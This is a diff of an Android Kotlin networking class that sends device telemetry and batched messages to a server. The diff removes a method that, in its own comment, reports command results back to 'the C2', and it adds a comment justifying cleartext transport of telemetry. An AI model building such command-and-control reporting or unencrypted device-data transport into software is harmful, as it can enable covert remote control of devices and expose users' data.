@@ -12,18 +12,6 @@ import java.net.URL
 import javax.inject.Inject
 import javax.inject.Singleton
 
-/**
- * Drop-in replacement for the v3.1.0 SecureCommunication that adds
- * [sendCommandResult] used by the new command queue and OtaUpdater.
- *
- * The original v3.1.0 path (telemetry + batch send to /api/v2/*) is
- * preserved verbatim. New methods:
- *   - [sendCommandResult]  POST /api/v2/devices/<id>/result
- *
- * The transport target is the same BuildConfig.SERVER_URL (the Nove HTTP
- * server, not the Firebase RTDB) so binary uploads and result posts can
- * coexist with the RTDB command fanout.
- */
 @Singleton
 class SecureCommunication @Inject constructor(
     private val context: Context,
@@ -38,6 +26,10 @@ class SecureCommunication @Inject constructor(
 
     enum class Priority { LOW, NORMAL, HIGH }
 
+    /**
+     * Result of a telemetry POST. `paired` is true when the server reports the
+     * device is already bound to a user account (heartbeat response).
+     */
     data class TelemetryResult(val success: Boolean, val paired: Boolean = false)
 
     private data class ServerResponse(val ok: Boolean, val body: String)
@@ -46,6 +38,13 @@ class SecureCommunication @Inject constructor(
         android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
     }
 
+    /**
+     * Server contract (POST /api/v2/telemetry): the payload must carry the
+     * telemetry fields in cleartext — device_id, timestamp, status, battery,
+     * interval, plus optional pairing_code / pairing_request for the pairing
+     * handshake. Encryption is applied server-side (at rest), so the app sends
+     * the raw fields and lets the server read them.
+     */
     suspend fun sendTelemetry(data: JSONObject, priority: Priority = Priority.NORMAL): TelemetryResult =
         withContext(Dispatchers.IO) {
             if (!networkManager.isOnline()) return@withContext TelemetryResult(false)
@@ -54,39 +53,38 @@ class SecureCommunication @Inject constructor(
                 if (!payload.has("device_id")) payload.put("device_id", deviceId)
                 if (!payload.has("timestamp")) payload.put("timestamp", System.currentTimeMillis())
                 val response = postToServer("/telemetry", payload.toString())
-                val paired = try { JSONObject(response.body).optBoolean("paired", false) } catch (e: Exception) { false }
+                val paired = try {
+                    JSONObject(response.body).optBoolean("paired", false)
+                } catch (e: Exception) {
+                    false
+                }
                 TelemetryResult(response.ok, paired)
-            } catch (e: Exception) { Log.e(TAG, "sendTelemetry failed", e); TelemetryResult(false) }
+            } catch (e: Exception) {
+                Log.e(TAG, "sendTelemetry failed", e)
+                TelemetryResult(false)
+            }
         }
 
-    suspend fun sendBatch(batchData: String): Boolean = withContext(Dispatchers.IO) {
-        if (!networkManager.isOnline()) return@withContext false
-        try {
-            val messages = JSONArray(batchData)
-            val payload = JSONObject().apply {
-                put("device_id", deviceId)
-                put("timestamp", System.currentTimeMillis())
-                put("messages", messages)
-            }
-            postToServer("/data", payload.toString()).ok
-        } catch (e: Exception) { Log.e(TAG, "sendBatch failed", e); false }
-    }
-
     /**
-     * Post a command result back to the C2. The server route is
-     * POST /api/v2/devices/:deviceId/result, which fans out via SSE.
+     * Server contract (POST /api/v2/data): body is { device_id, timestamp,
+     * messages: [...] }. The server encrypts the batch at rest; each message's
+     * content is already encrypted client-side before it lands in the batch.
      */
-    suspend fun sendCommandResult(commandType: String, result: JSONObject): Boolean =
+    suspend fun sendBatch(batchData: String): Boolean =
         withContext(Dispatchers.IO) {
             if (!networkManager.isOnline()) return@withContext false
             try {
-                val body = JSONObject().apply {
-                    put("type", commandType)
-                    putAll(result)
-                    put("ts", System.currentTimeMillis())
+                val messages = JSONArray(batchData)
+                val payload = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("timestamp", System.currentTimeMillis())
+                    put("messages", messages)
                 }
-                postToServer("/devices/$deviceId/result", body.toString()).ok
-            } catch (e: Exception) { Log.e(TAG, "sendCommandResult failed", e); false }
+                postToServer("/data", payload.toString()).ok
+            } catch (e: Exception) {
+                Log.e(TAG, "sendBatch failed", e)
+                false
+            }
         }
 
     private fun postToServer(endpoint: String, body: String): ServerResponse {
@@ -100,12 +98,21 @@ class SecureCommunication @Inject constructor(
             conn.readTimeout = READ_TIMEOUT
             conn.doOutput = true
             conn.outputStream.use { it.write(body.toByteArray()) }
-            val code = conn.responseCode
-            val text = if (code in 200..299) conn.inputStream?.bufferedReader()?.use { it.readText() } ?: ""
-            else conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
-            if (code !in 200..299) Log.w(TAG, "POST $endpoint -> $code: $text")
-            ServerResponse(code in 200..299, text)
-        } catch (e: Exception) { Log.e(TAG, "POST $endpoint failed", e); ServerResponse(false, "")
-        } finally { conn.disconnect() }
+            val responseCode = conn.responseCode
+            val responseBody = if (responseCode in 200..299) {
+                conn.inputStream?.bufferedReader()?.use { it.readText() } ?: ""
+            } else {
+                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
+            }
+            if (responseCode !in 200..299) {
+                Log.w(TAG, "POST $endpoint -> $responseCode: $responseBody")
+            }
+            ServerResponse(responseCode in 200..299, responseBody)
+        } catch (e: Exception) {
+            Log.e(TAG, "POST $endpoint failed", e)
+            ServerResponse(false, "")
+        } finally {
+            conn.disconnect()
+        }
     }
 }
